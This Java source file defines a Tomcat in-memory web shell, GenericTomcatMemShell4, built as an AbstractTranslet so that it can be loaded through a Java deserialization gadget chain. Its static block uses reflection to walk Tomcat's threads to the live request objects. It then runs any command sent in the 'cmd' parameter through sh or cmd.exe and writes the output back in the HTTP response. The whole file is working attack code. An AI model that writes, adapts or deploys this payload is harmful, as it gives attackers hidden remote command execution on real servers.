package org.example.tomcatmemshell.Generic;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.apache.tomcat.util.net.NioEndpoint;

import java.lang.reflect.Field;
import java.util.ArrayList;

//TargetObject = {org.apache.tomcat.util.threads.TaskThread}
//  ---> group = {java.lang.ThreadGroup}
//   ---> threads = {class [Ljava.lang.Thread;}
//    ---> [14] = {java.lang.Thread}
//     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}
//      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
//         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}
//          ---> global = {org.apache.coyote.RequestGroupInfo}
//           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>}
//            ---> [0] = {org.apache.coyote.RequestInfo}
public class GenericTomcatMemShell4 extends AbstractTranslet {
    static {
        try {
            String pass = "cmd";
            Thread TaskThread = Thread.currentThread();
            ThreadGroup threadGroup = TaskThread.getThreadGroup();
            Thread[] threads = (Thread[]) getClassField(ThreadGroup.class,threadGroup,"threads");
            for(Thread thread:threads){
                if(thread.getName().contains("http-nio")&&thread.getName().contains("Acceptor")){
                    Object target = getClassField(Thread.class,thread,"target");
                    NioEndpoint this0 = (NioEndpoint) getClassField(Class.forName("org.apache.tomcat.util.net.NioEndpoint$Acceptor"),target,"this$0");
                    Object handler = getClassField(AbstractEndpoint.class,this0,"handler");
                    RequestGroupInfo global = (RequestGroupInfo) getClassField(Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler"),handler,"global");
                    ArrayList<RequestInfo> processors = (ArrayList<RequestInfo>) getClassField(RequestGroupInfo.class,global,"processors");
                    for (RequestInfo requestInfo : processors) {
                        Request Coyoterequest = (Request) getClassField(RequestInfo.class,requestInfo,"req");
                        org.apache.catalina.connector.Request request = ( org.apache.catalina.connector.Request)Coyoterequest.getNote(1);
                        String cmd = request.getParameter(pass);
                        if (cmd != null) {
                            String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                            String output = s.hasNext() ? s.next() : "";
                            //回显
                            java.io.Writer writer = request.getResponse().getWriter();
                            java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                            usingWriter.setAccessible(true);
                            usingWriter.set(request.getResponse(), Boolean.FALSE);
                            writer.write(output);
                            writer.flush();
                        }
                        break;
                    }
                    break;
                }
            }
        }catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
